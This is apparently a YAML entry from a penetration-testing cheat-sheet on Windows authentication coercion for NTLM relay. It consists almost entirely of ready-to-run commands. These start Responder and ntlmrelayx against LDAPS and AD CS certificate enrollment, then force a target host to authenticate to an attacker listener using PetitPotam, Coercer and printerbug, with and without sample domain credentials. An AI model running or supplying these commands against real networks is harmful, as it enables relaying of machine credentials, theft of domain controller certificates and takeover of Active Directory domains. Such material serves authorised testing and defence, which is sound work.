---
description: |
  Authentication coercion attacks — force Windows hosts to authenticate to an attacker-controlled listener using PetitPotam, PrinterBug, DFSCoerce, and ShadowCoerce for NTLM relay.
commands:
  - have: No_Creds
    cmd: |
      # Step 1: Start listener FIRST (pick one)
      sudo responder -I eth0
      ntlmrelayx.py -t ldaps://10.10.10.27 -smb2support
      ntlmrelayx.py -t http://10.10.10.27/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

      # Step 2: Coerce auth (unauthenticated)
      python3 PetitPotam.py 10.10.10.21 10.10.10.27
      coercer scan -t 10.10.10.27 -u '' -p ''
  - have: Credentials
    cmd: |
      # Coerce (authenticated — more reliable)
      python3 PetitPotam.py -u sec_user -p 'P@ssw0rd' -d senshu.local 10.10.10.21 10.10.10.27
      coercer scan -t 10.10.10.27 -u sec_user -p 'P@ssw0rd' -d senshu.local
      coercer coerce -t 10.10.10.27 -l 10.10.10.21 -u sec_user -p 'P@ssw0rd' -d senshu.local
      python3 printerbug.py senshu.local/sec_user:'P@ssw0rd'@10.10.10.27 10.10.10.21

phase:
  - Exploitation
target_os:
  - Windows
services:
  - Active_Directory
  - SMB
  - RPC
techniques:
  - NTLM_Relay
references:
  - https://github.com/topotam/PetitPotam
  - https://github.com/p0dalirius/Coercer
  - https://github.com/dirkjanm/krbrelayx
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html
---
